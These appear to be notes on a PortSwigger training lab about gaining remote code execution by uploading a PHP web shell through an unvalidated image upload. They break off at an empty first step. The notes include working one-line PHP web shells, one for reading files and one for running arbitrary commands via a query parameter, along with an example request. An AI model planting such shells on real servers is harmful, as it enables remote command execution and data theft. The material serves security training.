# Lab: Remote code execution via web shell upload

## Description

 This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file */home/carlos/secret*. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: *wiener:peter* 

## Tips from portswigger

### Content-type response header

The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

### php webshells

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint. 

#### Example to read a file on server

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
 Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 

#### Example to execute a command

```php
<?php echo system($_GET['command']); ?>
```
 This script enables you to pass an arbitrary system command via a query parameter as follows: 
 
 ```
GET /example/exploit.php?command=id HTTP/1.1
```

# Step 1: Map file upload functionality
